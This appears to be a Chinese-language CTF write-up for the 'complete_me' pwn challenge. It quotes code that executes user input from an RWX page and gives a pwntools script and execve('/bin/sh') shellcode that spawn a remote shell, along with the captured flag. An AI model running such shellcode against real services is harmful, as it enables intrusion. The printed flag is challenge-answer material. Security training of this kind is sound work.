# complete_me

## 题目简述

程序通过 `mmap` 分配一页权限为 `7` 的内存，即同时可读、可写、可执行。随后用 `fgets` 把用户输入直接写入该页，并把页首强制转换为函数指针执行：

```c
char *code = mmap(0, 0x1000, 7,
                  MAP_SHARED | MAP_ANONYMOUS, 0, 0);
fgets(code, 0x1000, stdin);
((void (*)(void))code)();
```

因此不需要劫持返回地址，直接提交 amd64 Linux Shellcode 即可。

## 解题过程

程序没有 seccomp 或字节过滤，可以用 pwntools 生成 `execve("/bin/sh",0,0)` Shellcode：

```python
from pwn import *

context.arch = "amd64"
p = remote("HOST", PORT)
p.sendlineafter(b"The flag is: ", asm(shellcraft.sh()))
p.interactive()
```

对应的核心汇编为：

```asm
mov rax, 0x3b
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall
```

获得 Shell 后读取 `flag.txt`：

```text
greyhats{y0u_4r3_4n_4553mb1y_pr0}
```

## 方法总结

- 核心技巧：向 RWX 内存写入原生 Shellcode，再利用程序自带的间接调用执行。
- 识别信号：`mmap` 权限含 `PROT_EXEC`，输入缓冲区随后被转换为函数指针。
- 复用要点：发送前确认架构、系统调用 ABI 和输入函数对换行/空字节的处理；这类题无需额外构造 ROP。
